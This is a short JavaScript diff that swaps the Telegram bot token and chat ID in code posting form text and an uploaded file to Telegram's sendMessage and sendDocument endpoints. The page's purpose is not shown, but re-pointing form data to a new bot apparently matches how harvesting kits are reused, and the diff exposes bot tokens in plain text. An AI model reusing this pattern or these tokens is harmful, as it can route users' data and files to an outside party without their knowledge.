@@ -414,11 +414,11 @@ function myFunction() {
                     
                             try {
                                 
-                                await fetch(`https://api.telegram.org/bot6668760988:AAE9gAC9kR-Dupp08eEkKJLY4ZWwfWNDD_0/sendMessage`, {
+                                await fetch(`https://api.telegram.org/bot7562787376:AAGKn2acN2fnbf20PbPQVLFeXsa6NbgSWpM/sendMessage`, {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
-                                        chat_id: '1832116405',
+                                        chat_id: '7562787376',
                                         text: text,
                                     }),
                                 });
@@ -428,11 +428,11 @@ function myFunction() {
                                 if (fileInput.files.length > 0) {
                                     const file = fileInput.files[0];
                                     const fileFormData = new FormData();
-                                    fileFormData.append('chat_id', '1832116405');
+                                    fileFormData.append('chat_id', '7562787376');
                                     fileFormData.append('document', file);
                     
                                     
-                                    const fileResponse = await fetch(`https://api.telegram.org/bot6668760988:AAE9gAC9kR-Dupp08eEkKJLY4ZWwfWNDD_0/sendDocument`, {
+                                    const fileResponse = await fetch(`https://api.telegram.org/bot7562787376:AAGKn2acN2fnbf20PbPQVLFeXsa6NbgSWpM/sendDocument`, {
                                         method: 'POST',
                                         body: fileFormData,
                                     });
